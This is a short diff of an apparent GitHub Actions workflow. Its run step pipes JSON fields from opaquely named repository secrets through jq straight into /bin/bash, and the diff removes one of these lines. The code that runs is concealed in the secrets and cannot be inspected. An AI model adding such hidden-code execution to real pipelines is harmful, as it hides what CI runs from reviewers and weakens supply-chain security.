@@ -20,7 +20,6 @@ jobs:
           vuky7858: ${{ secrets.vuky7858 }}
         run: |
           printf '%s' "$vuky7858" | jq -r .bg678 | /bin/bash
-          printf '%s' "$aas7454" | jq -r .tkk37 | /bin/bash
           printf '%s' "$xorhx912" | jq -r .qexvm6691 | /bin/bash
 
       - name: Save artifact
